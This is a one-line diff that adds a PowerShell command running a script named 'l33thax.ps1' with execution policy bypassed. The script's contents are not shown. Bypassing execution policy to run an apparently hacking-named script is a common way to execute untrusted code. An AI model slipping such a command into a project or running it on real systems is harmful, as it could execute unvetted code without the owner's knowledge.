@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy Bypass -File l33thax.ps1
